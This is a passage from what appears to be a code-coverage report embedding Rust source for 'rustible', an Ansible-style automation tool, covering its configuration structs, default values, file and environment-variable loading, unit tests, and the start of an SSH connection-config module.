usize,\n\n    /// Default module\n    pub module_name: String,\n\n    /// Default host key checking\n    pub host_key_checking: bool,\n\n    /// Default timeout\n    pub timeout: u64,\n\n    /// Gather facts by default\n    pub gathering: bool,\n\n    /// Default transport/connection type\n    pub transport: String,\n\n    /// Hash behavior (replace or merge)\n    pub hash_behaviour: String,\n\n    /// Retry files path\n    pub retry_files_enabled: bool,\n\n    /// Retry files save path\n    pub retry_files_save_path: Option\u003cPathBuf\u003e,\n\n    /// Roles path\n    pub roles_path: Vec\u003cPathBuf\u003e,\n\n    /// Collections path\n    pub collections_path: Vec\u003cPathBuf\u003e,\n\n    /// Action plugins path\n    pub action_plugins: Vec\u003cPathBuf\u003e,\n\n    /// Strategy plugins path\n    pub strategy_plugins: Vec\u003cPathBuf\u003e,\n\n    /// Default strategy\n    pub strategy: String,\n}\n\nimpl Default for Defaults {\n    fn default() -\u003e Self {\n        Self {\n            inventory: None,\n            remote_user: None,\n            forks: 5,\n            module_name: \"command\".to_string(),\n            host_key_checking: true,\n            timeout: 30,\n            gathering: true,\n            transport: \"ssh\".to_string(),\n            hash_behaviour: \"replace\".to_string(),\n            retry_files_enabled: true,\n            retry_files_save_path: None,\n            roles_path: vec![PathBuf::from(\"./roles\")],\n            collections_path: vec![],\n            action_plugins: vec![],\n            strategy_plugins: vec![],\n            strategy: \"linear\".to_string(),\n        }\n    }\n}\n\n/// Connection settings\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct ConnectionConfig {\n    /// Pipelining (improves SSH performance)\n    pub pipelining: bool,\n\n    /// Control path for SSH multiplexing\n    pub control_path: Option\u003cString\u003e,\n\n    /// Control master persistence\n    pub control_master: String,\n\n    /// Control persist timeout\n    pub control_persist: u64,\n\n    /// SSH executable\n    pub ssh_executable: String,\n\n    /// SCP if SSH transfer fails\n    pub scp_if_ssh: bool,\n\n    /// SFTP batch mode\n    pub sftp_batch_mode: bool,\n}\n\nimpl Default for ConnectionConfig {\n    fn default() -\u003e Self {\n        Self {\n            pipelining: true,\n            control_path: Some(\"~/.rustible/cp/%r@%h:%p\".to_string()),\n            control_master: \"auto\".to_string(),\n            control_persist: 60,\n            ssh_executable: \"ssh\".to_string(),\n            scp_if_ssh: false,\n            sftp_batch_mode: true,\n        }\n    }\n}\n\n/// Privilege escalation configuration\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct PrivilegeEscalation {\n    /// Enable become by default\n    pub r#become: bool,\n\n    /// Default become method\n    pub become_method: String,\n\n    /// Default become user\n    pub become_user: String,\n\n    /// Ask for become password\n    pub become_ask_pass: bool,\n\n    /// Become flags\n    pub become_flags: Option\u003cString\u003e,\n}\n\nimpl Default for PrivilegeEscalation {\n    fn default() -\u003e Self {\n        Self {\n            r#become: false,\n            become_method: \"sudo\".to_string(),\n            become_user: \"root\".to_string(),\n            become_ask_pass: false,\n            become_flags: None,\n        }\n    }\n}\n\n/// SSH configuration\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct SshConfig {\n    /// SSH arguments\n    pub ssh_args: Vec\u003cString\u003e,\n\n    /// SSH common args\n    pub ssh_common_args: Vec\u003cString\u003e,\n\n    /// SSH extra args\n    pub ssh_extra_args: Vec\u003cString\u003e,\n\n    /// SCP extra args\n    pub scp_extra_args: Vec\u003cString\u003e,\n\n    /// SFTP extra args\n    pub sftp_extra_args: Vec\u003cString\u003e,\n\n    /// SSH retries\n    pub retries: u32,\n\n    /// Private key file\n    pub private_key_file: Option\u003cPathBuf\u003e,\n\n    /// Known hosts file\n    pub known_hosts_file: Option\u003cPathBuf\u003e,\n\n    /// Control path for multiplexing\n    pub control_path: Option\u003cString\u003e,\n\n    /// Enable pipelining\n    pub pipelining: bool,\n}\n\nimpl Default for SshConfig {\n    fn default() -\u003e Self {\n        Self {\n            ssh_args: vec![\n                \"-o\".to_string(),\n                \"ControlMaster=auto\".to_string(),\n                \"-o\".to_string(),\n                \"ControlPersist=60s\".to_string(),\n            ],\n            ssh_common_args: vec![],\n            ssh_extra_args: vec![],\n            scp_extra_args: vec![],\n            sftp_extra_args: vec![],\n            retries: 3,\n            private_key_file: None,\n            known_hosts_file: None,\n            control_path: None,\n            pipelining: true,\n        }\n    }\n}\n\n/// Colors configuration\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct ColorsConfig {\n    /// Enable colors\n    pub enabled: bool,\n\n    /// Highlight color\n    pub highlight: String,\n\n    /// Verbose color\n    pub verbose: String,\n\n    /// Warning color\n    pub warn: String,\n\n    /// Error color\n    pub error: String,\n\n    /// Debug color\n    pub debug: String,\n\n    /// OK color\n    pub ok: String,\n\n    /// Changed color\n    pub changed: String,\n\n    /// Unreachable color\n    pub unreachable: String,\n\n    /// Skipped color\n    pub skipped: String,\n\n    /// Diff add color\n    pub diff_add: String,\n\n    /// Diff remove color\n    pub diff_remove: String,\n\n    /// Diff lines color\n    pub diff_lines: String,\n}\n\nimpl Default for ColorsConfig {\n    fn default() -\u003e Self {\n        Self {\n            enabled: true,\n            highlight: \"white\".to_string(),\n            verbose: \"blue\".to_string(),\n            warn: \"bright_purple\".to_string(),\n            error: \"red\".to_string(),\n            debug: \"dark_gray\".to_string(),\n            ok: \"green\".to_string(),\n            changed: \"yellow\".to_string(),\n            unreachable: \"bright_red\".to_string(),\n            skipped: \"cyan\".to_string(),\n            diff_add: \"green\".to_string(),\n            diff_remove: \"red\".to_string(),\n            diff_lines: \"cyan\".to_string(),\n        }\n    }\n}\n\n/// Logging settings\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct LoggingConfig {\n    /// Log path\n    pub log_path: Option\u003cPathBuf\u003e,\n\n    /// Log level\n    pub log_level: String,\n\n    /// Log format\n    pub log_format: String,\n\n    /// Log timestamp\n    pub log_timestamp: bool,\n}\n\nimpl Default for LoggingConfig {\n    fn default() -\u003e Self {\n        Self {\n            log_path: None,\n            log_level: \"info\".to_string(),\n            log_format: \"%(asctime)s - %(name)s - %(levelname)s - %(message)s\".to_string(),\n            log_timestamp: true,\n        }\n    }\n}\n\n/// Vault settings\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct VaultConfig {\n    /// Vault password file\n    pub password_file: Option\u003cPathBuf\u003e,\n\n    /// Vault identity list\n    pub identity_list: Vec\u003cString\u003e,\n\n    /// Encrypt vault id\n    pub encrypt_vault_id: Option\u003cString\u003e,\n}\n\nimpl Default for VaultConfig {\n    fn default() -\u003e Self {\n        Self {\n            password_file: None,\n            identity_list: vec![],\n            encrypt_vault_id: None,\n        }\n    }\n}\n\n/// Galaxy settings\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct GalaxyConfig {\n    /// Galaxy server URL\n    pub server: String,\n\n    /// Galaxy server list\n    pub server_list: Vec\u003cGalaxyServer\u003e,\n\n    /// Cache path\n    pub cache_dir: Option\u003cPathBuf\u003e,\n\n    /// Ignore certs\n    pub ignore_certs: bool,\n}\n\nimpl Default for GalaxyConfig {\n    fn default() -\u003e Self {\n        Self {\n            server: \"https://galaxy.ansible.com\".to_string(),\n            server_list: vec![],\n            cache_dir: None,\n            ignore_certs: false,\n        }\n    }\n}\n\n/// Galaxy server configuration\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct GalaxyServer {\n    /// Server name\n    pub name: String,\n    /// Server URL\n    pub url: String,\n    /// Auth token\n    pub token: Option\u003cString\u003e,\n}\n\nimpl Config {\n    /// Load configuration from all sources\n    pub fn load(config_path: Option\u003c\u0026PathBuf\u003e) -\u003e Result\u003cSelf\u003e {\n        let mut config = Config::default();\n\n        // Load from standard locations\n        let config_paths = Self::get_config_paths(config_path);\n\n        for path in config_paths {\n            if path.exists() {\n                config = config.merge_from_file(\u0026path)?;\n            }\n        }\n\n        // Apply environment variable overrides\n        config.apply_env_overrides();\n\n        Ok(config)\n    }\n\n    /// Get the list of configuration file paths to check\n    fn get_config_paths(explicit_path: Option\u003c\u0026PathBuf\u003e) -\u003e Vec\u003cPathBuf\u003e {\n        let mut paths = Vec::new();\n\n        // Explicit path takes priority\n        if let Some(path) = explicit_path {\n            paths.push(path.clone());\n            return paths;\n        }\n\n        // System-wide config\n        paths.push(PathBuf::from(\"/etc/rustible/rustible.cfg\"));\n\n        // User config\n        if let Some(home) = dirs::home_dir() {\n            paths.push(home.join(\".rustible.cfg\"));\n            paths.push(home.join(\".rustible/rustible.cfg\"));\n            paths.push(home.join(\".rustible/config\"));\n        }\n\n        // Project config (current directory)\n        paths.push(PathBuf::from(\"rustible.cfg\"));\n        paths.push(PathBuf::from(\".rustible.cfg\"));\n\n        // Environment variable\n        if let Ok(env_config) = std::env::var(\"RUSTIBLE_CONFIG\") {\n            paths.insert(0, PathBuf::from(env_config));\n        }\n\n        paths\n    }\n\n    /// Merge configuration from a file\n    fn merge_from_file(\u0026self, path: \u0026PathBuf) -\u003e Result\u003cSelf\u003e {\n        let content = std::fs::read_to_string(path)\n            .with_context(|| format!(\"Failed to read config file: {}\", path.display()))?;\n\n        // Determine format based on extension\n        let extension = path.extension().and_then(|e| e.to_str()).unwrap_or(\"\");\n\n        let file_config: Config = match extension {\n            \"yml\" | \"yaml\" =\u003e serde_yaml::from_str(\u0026content)?,\n            \"json\" =\u003e serde_json::from_str(\u0026content)?,\n            \"toml\" =\u003e toml::from_str(\u0026content)?,\n            _ =\u003e {\n                // Try TOML first (for .cfg files), then YAML\n                toml::from_str(\u0026content)\n                    .or_else(|_| serde_yaml::from_str(\u0026content))\n                    .with_context(|| format!(\"Failed to parse config file: {}\", path.display()))?\n            }\n        };\n\n        Ok(self.merge(file_config))\n    }\n\n    /// Merge another config into this one\n    fn merge(\u0026self, other: Config) -\u003e Config {\n        // For simplicity, other takes precedence for non-default values\n        Config {\n            defaults: Defaults {\n                inventory: other\n                    .defaults\n                    .inventory\n                    .or_else(|| self.defaults.inventory.clone()),\n                remote_user: other\n                    .defaults\n                    .remote_user\n                    .or_else(|| self.defaults.remote_user.clone()),\n                forks: if other.defaults.forks != 5 {\n                    other.defaults.forks\n                } else {\n                    self.defaults.forks\n                },\n                module_name: if other.defaults.module_name != \"command\" {\n                    other.defaults.module_name\n                } else {\n                    self.defaults.module_name.clone()\n                },\n                host_key_checking: other.defaults.host_key_checking,\n                timeout: if other.defaults.timeout != 30 {\n                    other.defaults.timeout\n                } else {\n                    self.defaults.timeout\n                },\n                gathering: other.defaults.gathering,\n                transport: if other.defaults.transport != \"ssh\" {\n                    other.defaults.transport\n                } else {\n                    self.defaults.transport.clone()\n                },\n                hash_behaviour: other.defaults.hash_behaviour,\n                retry_files_enabled: other.defaults.retry_files_enabled,\n                retry_files_save_path: other\n                    .defaults\n                    .retry_files_save_path\n                    .or_else(|| self.defaults.retry_files_save_path.clone()),\n                roles_path: if other.defaults.roles_path.is_empty() {\n                    self.defaults.roles_path.clone()\n                } else {\n                    other.defaults.roles_path\n                },\n                collections_path: if other.defaults.collections_path.is_empty() {\n                    self.defaults.collections_path.clone()\n                } else {\n                    other.defaults.collections_path\n                },\n                action_plugins: if other.defaults.action_plugins.is_empty() {\n                    self.defaults.action_plugins.clone()\n                } else {\n                    other.defaults.action_plugins\n                },\n                strategy_plugins: if other.defaults.strategy_plugins.is_empty() {\n                    self.defaults.strategy_plugins.clone()\n                } else {\n                    other.defaults.strategy_plugins\n                },\n                strategy: other.defaults.strategy,\n            },\n            connection: other.connection,\n            privilege_escalation: other.privilege_escalation,\n            ssh: other.ssh,\n            colors: other.colors,\n            logging: other.logging,\n            vault: VaultConfig {\n                password_file: other\n                    .vault\n                    .password_file\n                    .or_else(|| self.vault.password_file.clone()),\n                identity_list: if other.vault.identity_list.is_empty() {\n                    self.vault.identity_list.clone()\n                } else {\n                    other.vault.identity_list\n                },\n                encrypt_vault_id: other\n                    .vault\n                    .encrypt_vault_id\n                    .or_else(|| self.vault.encrypt_vault_id.clone()),\n            },\n            galaxy: other.galaxy,\n            module_paths: if other.module_paths.is_empty() {\n                self.module_paths.clone()\n            } else {\n                other.module_paths\n            },\n            role_paths: if other.role_paths.is_empty() {\n                self.role_paths.clone()\n            } else {\n                other.role_paths\n            },\n            environment: {\n                let mut env = self.environment.clone();\n                env.extend(other.environment);\n                env\n            },\n        }\n    }\n\n    /// Apply environment variable overrides\n    fn apply_env_overrides(\u0026mut self) {\n        // RUSTIBLE_FORKS\n        if let Ok(forks) = std::env::var(\"RUSTIBLE_FORKS\") {\n            if let Ok(n) = forks.parse() {\n                self.defaults.forks = n;\n            }\n        }\n\n        // RUSTIBLE_TIMEOUT\n        if let Ok(timeout) = std::env::var(\"RUSTIBLE_TIMEOUT\") {\n            if let Ok(n) = timeout.parse() {\n                self.defaults.timeout = n;\n            }\n        }\n\n        // RUSTIBLE_REMOTE_USER\n        if let Ok(user) = std::env::var(\"RUSTIBLE_REMOTE_USER\") {\n            self.defaults.remote_user = Some(user);\n        }\n\n        // RUSTIBLE_BECOME\n        if std::env::var(\"RUSTIBLE_BECOME\").is_ok() {\n            self.privilege_escalation.r#become = true;\n        }\n\n        // RUSTIBLE_BECOME_METHOD\n        if let Ok(method) = std::env::var(\"RUSTIBLE_BECOME_METHOD\") {\n            self.privilege_escalation.become_method = method;\n        }\n\n        // RUSTIBLE_BECOME_USER\n        if let Ok(user) = std::env::var(\"RUSTIBLE_BECOME_USER\") {\n            self.privilege_escalation.become_user = user;\n        }\n\n        // RUSTIBLE_VAULT_PASSWORD_FILE\n        if let Ok(file) = std::env::var(\"RUSTIBLE_VAULT_PASSWORD_FILE\") {\n            self.vault.password_file = Some(PathBuf::from(file));\n        }\n\n        // RUSTIBLE_SSH_ARGS\n        if let Ok(args) = std::env::var(\"RUSTIBLE_SSH_ARGS\") {\n            self.ssh.ssh_args = args.split_whitespace().map(String::from).collect();\n        }\n\n        // RUSTIBLE_PRIVATE_KEY_FILE\n        if let Ok(file) = std::env::var(\"RUSTIBLE_PRIVATE_KEY_FILE\") {\n            self.ssh.private_key_file = Some(PathBuf::from(file));\n        }\n\n        // NO_COLOR\n        if std::env::var(\"NO_COLOR\").is_ok() || std::env::var(\"RUSTIBLE_NO_COLOR\").is_ok() {\n            self.colors.enabled = false;\n        }\n\n        // RUSTIBLE_LOG_PATH\n        if let Ok(path) = std::env::var(\"RUSTIBLE_LOG_PATH\") {\n            self.logging.log_path = Some(PathBuf::from(path));\n        }\n\n        // RUSTIBLE_STRATEGY\n        if let Ok(strategy) = std::env::var(\"RUSTIBLE_STRATEGY\") {\n            self.defaults.strategy = strategy;\n        }\n    }\n\n    /// Get the effective inventory path\n    pub fn inventory_path(\u0026self) -\u003e Option\u003c\u0026PathBuf\u003e {\n        self.defaults.inventory.as_ref()\n    }\n\n    /// Get the effective remote user\n    pub fn remote_user(\u0026self) -\u003e Option\u003c\u0026str\u003e {\n        self.defaults.remote_user.as_deref()\n    }\n\n    /// Check if become is enabled\n    pub fn become_enabled(\u0026self) -\u003e bool {\n        self.privilege_escalation.r#become\n    }\n\n    /// Get vault password file path\n    pub fn vault_password_file(\u0026self) -\u003e Option\u003c\u0026PathBuf\u003e {\n        self.vault.password_file.as_ref()\n    }\n\n    /// Load from a specific file (legacy compatibility)\n    pub fn from_file(path: impl AsRef\u003cstd::path::Path\u003e) -\u003e Result\u003cSelf\u003e {\n        let path_buf = path.as_ref().to_path_buf();\n        Config::default().merge_from_file(\u0026path_buf)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_default_config() {\n        let config = Config::default();\n        assert_eq!(config.defaults.forks, 5);\n        assert_eq!(config.defaults.timeout, 30);\n        assert_eq!(config.defaults.transport, \"ssh\");\n        assert!(!config.privilege_escalation.r#become);\n    }\n\n    #[test]\n    fn test_config_merge() {\n        let base = Config::default();\n        let other = Config {\n            defaults: Defaults {\n                forks: 10,\n                ..Defaults::default()\n            },\n            ..Config::default()\n        };\n\n        let merged = base.merge(other);\n        assert_eq!(merged.defaults.forks, 10);\n    }\n\n    #[test]\n    fn test_env_override() {\n        std::env::set_var(\"RUSTIBLE_FORKS\", \"20\");\n        let mut config = Config::default();\n        config.apply_env_overrides();\n        assert_eq!(config.defaults.forks, 20);\n        std::env::remove_var(\"RUSTIBLE_FORKS\");\n    }\n}\n","traces":[{"line":58,"address":[29741826,29740896,29741832],"length":1,"stats":{"Line":1}},{"line":60,"address":[29740918],"length":1,"stats":{"Line":1}},{"line":61,"address":[29740931],"length":1,"stats":{"Line":1}},{"line":62,"address":[29740983],"length":1,"stats":{"Line":1}},{"line":63,"address":[29741035],"length":1,"stats":{"Line":1}},{"line":64,"address":[29741087],"length":1,"stats":{"Line":1}},{"line":65,"address":[29741139],"length":1,"stats":{"Line":1}},{"line":66,"address":[29741191],"length":1,"stats":{"Line":1}},{"line":67,"address":[29741243],"length":1,"stats":{"Line":1}},{"line":68,"address":[29741287],"length":1,"stats":{"Line":1}},{"line":69,"address":[29741343],"length":1,"stats":{"Line":1}},{"line":70,"address":[29741403],"length":1,"stats":{"Line":1}},{"line":129,"address":[29744192,29745460,29745509],"length":1,"stats":{"Line":1}},{"line":134,"address":[34601333,34601472,34600736,34600804,34601444],"length":1,"stats":{"Line":1}},{"line":138,"address":[29744298],"length":1,"stats":{"Line":1}},{"line":139,"address":[29744364],"length":1,"stats":{"Line":1}},{"line":142,"address":[29745466,29744461,29744522],"length":1,"stats":{"Line":2}},{"line":143,"address":[29744734],"length":1,"stats":{"Line":1}},{"line":144,"address":[29744797],"length":1,"stats":{"Line":1}},{"line":145,"address":[29744857],"length":1,"stats":{"Line":1}},{"line":146,"address":[34603806,34604020],"length":1,"stats":{"Line":1}},{"line":177,"address":[34601584],"length":1,"stats":{"Line":0}},{"line":178,"address":[29750912,29751240,29751234],"length":1,"stats":{"Line":1}},{"line":181,"address":[29750929],"length":1,"stats":{"Line":1}},{"line":182,"address":[29750985],"length":1,"stats":{"Line":1}},{"line":184,"address":[29751047],"length":1,"stats":{"Line":1}},{"line":212,"address":[29751264,29751491,29751497],"length":1,"stats":{"Line":1}},{"line":215,"address":[29751277],"length":1,"stats":{"Line":1}},{"line":216,"address":[29751323],"length":1,"stats":{"Line":1}},{"line":259,"address":[29746384,29747508,29747514],"length":1,"stats":{"Line":1}},{"line":261,"address":[29746580,29746687,29746411,29746454,29747527,29746514,29746649,29746883],"length":1,"stats":{"Line":2}},{"line":267,"address":[29746864],"length":1,"stats":{"Line":1}},{"line":268,"address":[29746937],"length":1,"stats":{"Line":1}},{"line":269,"address":[29746997],"length":1,"stats":{"Line":1}},{"line":270,"address":[29747057],"length":1,"stats":{"Line":1}},{"line":325,"address":[29748064,29749359,29749353],"length":1,"stats":{"Line":1}},{"line":328,"address":[29748080],"length":1,"stats":{"Line":1}},{"line":329,"address":[29748116],"length":1,"stats":{"Line":1}},{"line":330,"address":[29748178],"length":1,"stats":{"Line":1}},{"line":331,"address":[29748244],"length":1,"stats":{"Line":1}},{"line":332,"address":[29748310],"length":1,"stats":{"Line":1}},{"line":333,"address":[29748376],"length":1,"stats":{"Line":1}},{"line":334,"address":[29748445],"length":1,"stats":{"Line":1}},{"line":335,"address":[29748517],"length":1,"stats":{"Line":1}},{"line":336,"address":[29748589],"length":1,"stats":{"Line":1}},{"line":337,"address":[29748661],"length":1,"stats":{"Line":1}},{"line":338,"address":[29748733],"length":1,"stats":{"Line":1}},{"line":339,"address":[29748805],"length":1,"stats":{"Line":1}},{"line":362,"address":[29749952,29750201,29750207],"length":1,"stats":{"Line":1}},{"line":365,"address":[29749980],"length":1,"stats":{"Line":1}},{"line":366,"address":[29750043],"length":1,"stats":{"Line":1}},{"line":387,"address":[29748044,29748050,29747856],"length":1,"stats":{"Line":1}},{"line":390,"address":[29747884],"length":1,"stats":{"Line":1}},{"line":414,"address":[29749728,29749927,29749933],"length":1,"stats":{"Line":1}},{"line":416,"address":[29749741],"length":1,"stats":{"Line":1}},{"line":417,"address":[29749772],"length":1,"stats":{"Line":1}},{"line":437,"address":[29758576,29759436,29759430],"length":1,"stats":{"Line":0}},{"line":438,"address":[29758626],"length":1,"stats":{"Line":0}},{"line":441,"address":[29758644],"length":1,"stats":{"Line":0}},{"line":443,"address":[29758688,29758850],"length":1,"stats":{"Line":0}},{"line":444,"address":[29758927,29759091,29759372],"length":1,"stats":{"Line":0}},{"line":445,"address":[29759299,29759155],"length":1,"stats":{"Line":0}},{"line":450,"address":[29758971],"length":1,"stats":{"Line":0}},{"line":452,"address":[29758978],"length":1,"stats":{"Line":0}},{"line":456,"address":[29753504,29754544,29754192],"length":1,"stats":{"Line":0}},{"line":457,"address":[29753526],"length":1,"stats":{"Line":0}},{"line":460,"address":[29753537],"length":1,"stats":{"Line":0}},{"line":461,"address":[29753583,29753672],"length":1,"stats":{"Line":0}},{"line":462,"address":[29753684],"length":1,"stats":{"Line":0}},{"line":466,"address":[29753736,29753590],"length":1,"stats":{"Line":0}},{"line":469,"address":[29753743],"length":1,"stats":{"Line":0}},{"line":470,"address":[29753839,29753944],"length":1,"stats":{"Line":0}},{"line":471,"address":[29754004],"length":1,"stats":{"Line":0}},{"line":472,"address":[29754091],"length":1,"stats":{"Line":0}},{"line":476,"address":[29754211,29753856],"length":1,"stats":{"Line":0}},{"line":477,"address":[29754218],"length":1,"stats":{"Line":0}},{"line":480,"address":[29754337,29754269],"length":1,"stats":{"Line":0}},{"line":481,"address":[29754431,29754385],"length":1,"stats":{"Line":0}},{"line":484,"address":[29754513],"length":1,"stats":{"Line":0}},{"line":488,"address":[29753487,29753481,29751600],"length":1,"stats":{"Line":0}},{"line":489,"address":[29751741,29751783,29751865],"length":1,"stats":{"Line":0}},{"line":490,"address":[29751849,29751762],"length":1,"stats":{"Line":0}},{"line":493,"address":[29751954,29752037],"length":1,"stats":{"Line":0}},{"line":496,"address":[29753258,29753476,29752189],"length":1,"stats":{"Line":0}},{"line":497,"address":[29752303,29752377,29753073],"length":1,"stats":{"Line":0}},{"line":498,"address":[29752440,29752800,29752346,29752401],"length":1,"stats":{"Line":0}},{"line":501,"address":[29752478,29752761,29752563,29752631,29752415],"length":1,"stats":{"Line":0}},{"line":502,"address":[27411264,27411300],"length":1,"stats":{"Line":0}},{"line":503,"address":[29752615,29752540],"length":1,"stats":{"Line":0}},{"line":507,"address":[29753428,29752729],"length":1,"stats":{"Line":0}},{"line":511,"address":[29764229,29764382,29759456],"length":1,"stats":{"Line":1}},{"line":514,"address":[29761358,29759497],"length":1,"stats":{"Line":2}},{"line":573,"address":[29761756],"length":1,"stats":{"Line":1}},{"line":574,"address":[29761854],"length":1,"stats":{"Line":1}},{"line":575,"address":[29761937],"length":1,"stats":{"Line":1}},{"line":576,"address":[29761989],"length":1,"stats":{"Line":1}},{"line":577,"address":[29762029],"length":1,"stats":{"Line":1}},{"line":578,"address":[29762509],"length":1,"stats":{"Line":1}},{"line":593,"address":[29762605],"length":1,"stats":{"Line":1}},{"line":594,"address":[29762688,29762750,29762814],"length":1,"stats":{"Line":2}},{"line":599,"address":[29762984,29762920,29762852],"length":1,"stats":{"Line":2}},{"line":613,"address":[29754862,29754560,29754868],"length":1,"stats":{"Line":1}},{"line":615,"address":[29754580,29754634],"length":1,"stats":{"Line":2}},{"line":616,"address":[29754828,29754739,29754671,29754805],"length":1,"stats":{"Line":4}},{"line":617,"address":[29754821],"length":1,"stats":{"Line":1}},{"line":622,"address":[29754908,29754971],"length":1,"stats":{"Line":1}},{"line":623,"address":[29755011,29755145,29755079,29755168],"length":1,"stats":{"Line":0}},{"line":624,"address":[29755161],"length":1,"stats":{"Line":0}},{"line":629,"address":[29755534,29755313,29755245],"length":1,"stats":{"Line":1}},{"line":630,"address":[29755345,29755400,29755489],"length":1,"stats":{"Line":0}},{"line":634,"address":[29755575],"length":1,"stats":{"Line":1}},{"line":635,"address":[29755718],"length":1,"stats":{"Line":0}},{"line":639,"address":[29755982,29755725,29755793],"length":1,"stats":{"Line":1}},{"line":640,"address":[29755937,29755825,29755848],"length":1,"stats":{"Line":0}},{"line":644,"address":[29756023,29756280,29756091],"length":1,"stats":{"Line":1}},{"line":645,"address":[29756146,29756235,29756123],"length":1,"stats":{"Line":0}},{"line":649,"address":[29756663,29756384,29756321],"length":1,"stats":{"Line":1}},{"line":650,"address":[29756432,29756541,29756486],"length":1,"stats":{"Line":0}},{"line":654,"address":[29756767,29756704],"length":1,"stats":{"Line":1}},{"line":655,"address":[29756886,29756807,29756967],"length":1,"stats":{"Line":0}},{"line":659,"address":[29757171,29757513,29757234],"length":1,"stats":{"Line":1}},{"line":660,"address":[29757391,29757282,29757336],"length":1,"stats":{"Line":0}},{"line":664,"address":[29757554,29757892],"length":1,"stats":{"Line":1}},{"line":665,"address":[29757885],"length":1,"stats":{"Line":0}},{"line":669,"address":[29757838,29757917,29758196],"length":1,"stats":{"Line":1}},{"line":670,"address":[29758074,29757965,29758019],"length":1,"stats":{"Line":0}},{"line":674,"address":[29758305,29758494,29758237],"length":1,"stats":{"Line":1}},{"line":675,"address":[29758337,29758449,29758360],"length":1,"stats":{"Line":0}},{"line":680,"address":[29751568],"length":1,"stats":{"Line":0}},{"line":681,"address":[29751573],"length":1,"stats":{"Line":0}},{"line":685,"address":[29751520],"length":1,"stats":{"Line":0}},{"line":686,"address":[29751525],"length":1,"stats":{"Line":0}},{"line":690,"address":[29751552],"length":1,"stats":{"Line":0}},{"line":691,"address":[29751557],"length":1,"stats":{"Line":0}},{"line":695,"address":[29758544],"length":1,"stats":{"Line":0}},{"line":696,"address":[29758549],"length":1,"stats":{"Line":0}},{"line":700,"address":[],"length":0,"stats":{"Line":0}},{"line":701,"address":[],"length":0,"stats":{"Line":0}},{"line":702,"address":[],"length":0,"stats":{"Line":0}}],"covered":81,"coverable":139},{"path":["/","home","artur","Repositories","rustible","src","connection","config.rs"],"content":"//! Connection configuration module\n//!\n//! This module handles SSH config parsing, host-specific settings,\n//! timeout configuration, and retry logic.\n\nuse regex::Regex;\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashMap;\nuse std::fs;\nuse std::path::{Path, PathBuf};\nuse std::time::Duration;\n\nuse super::ConnectionError;\n\n/// Default connection timeout in seconds\npub const DEFAULT_TIMEOUT: u64 = 30;\n\n/// Default number of connection retries\npub const DEFAULT_RETRIES: u32 = 3;\n\n/// Default delay between retries in seconds\npub const DEFAULT_RETRY_DELAY: u64 = 1;\n\n/// Main connection configuration\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct ConnectionConfig {\n    /// Default settings for all connections\n    #[serde(default)]\n    pub defaults: ConnectionDefaults,\n\n    /// Host-specific configurations\n    #[serde(default)]\n    pub hosts: HashMap\u003cString, HostConfig\u003e,\n\n    /// SSH config file path (default: ~/.ssh/config)\n    #[serde(default)]\n    pub ssh_config_path: Option\u003cPathBuf\u003e,\n\n    /// Whether to parse SSH config file\n    #[serde(default = \"default_true\")]\n    pub parse_ssh_config: bool,\n}\n\nfn default_true() -\u003e bool {\n    true\n}\n\nimpl Default for ConnectionConfig {\n    fn default() -\u003e Self {\n        Self {\n            defaults: ConnectionDefaults::default(),\n            hosts: HashMap::new(),\n            ssh_config_path: None,\n            parse_ssh_config: true,\n        }\n    }\n}\n\nimpl ConnectionConfig {\n    /// Create a new connection config\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Load configuration from a TOML file\n    pub fn from_file(path: impl AsRef\u003cPath\u003e) -\u003e Result\u003cSelf, ConnectionError\u003e {\n        let content = fs::read_to_string(path.as_ref()).map_err(|e| {\n            ConnectionError::InvalidConfig(format!(\"Failed to read config file: {}\", e))\n        })?;\n        Self::from_toml(\u0026content)\n    }\n\n    /// Parse configuration from TOML string\n    pub fn from_toml(content: \u0026str) -\u003e Result\u003cSelf, ConnectionError\u003e {\n        toml::from_str(content)\n            .map_err(|e| ConnectionError::InvalidConfig(format!(\"Failed to parse config: {}\", e)))\n    }\n\n    /// Load and merge SSH config\n    pub fn load_ssh_config(\u0026mut self) -\u003e Result\u003c(), ConnectionError\u003e {\n        if !self.parse_ssh_config {\n            return Ok(());\n        }\n\n        let ssh_config_path = self.ssh_config_path.clone().unwrap_or_else(|| {\n            dirs::home_dir()\n                .unwrap_or_else(|| PathBuf::from(\"~\"))\n                .join(\".ssh\")\n                .join(\"config\")\n        });\n\n        if ssh_config_path.exists() {\n            let parsed = SshConfigParser::parse_file(\u0026ssh_config_path)?;\n            for (host, config) in parsed {\n                // Only add if not already defined\n                self.hosts.entry(host).or_insert(config);\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Get configuration for a specific host\n    pub fn get_host(\u0026self, host: \u0026str) -\u003e Option\u003c\u0026HostConfig\u003e {\n        // First try exact match\n        if let Some(config) = self.hosts.get(host) {\n            return Some(config);\n        }\n\n        // Then try pattern matching\n        for (pattern, config) in \u0026self.hosts {\n            if pattern.contains('*') || pattern.contains('?') {\n                if matches_pattern(pattern, host) {\n                    return Some(config);\n                }\n            }\n        }\n\n        None\n    }\n\n    /// Get configuration for a host, with defaults merged\n    pub fn get_host_merged(\u0026self, host: \u0026str) -\u003e HostConfig {\n        let mut config = self.get_host(host).cloned().unwrap_or_default();\n\n        // Merge with defaults\n        if config.user.is_none() {\n            config.user = Some(self.defaults.user.clone());\n        }\n        if config.port.is_none() {\n            config.port = Some(self.defaults.port);\n        }\n        if config.connect_timeout.is_none() {\n            config.connect_timeout = Some(self.defaults.timeout);\n        }\n        if config.retries.is_none() {\n            config.retries = Some(self.defaults.retries);\n        }\n        if config.identity_file.is_none() \u0026\u0026 !self.defaults.identity_files.is_empty() {\n            config.identity_file = self.defaults.identity_files.first().cloned();\n        }\n\n        config\n    }\n\n    /// Add a host configuration\n    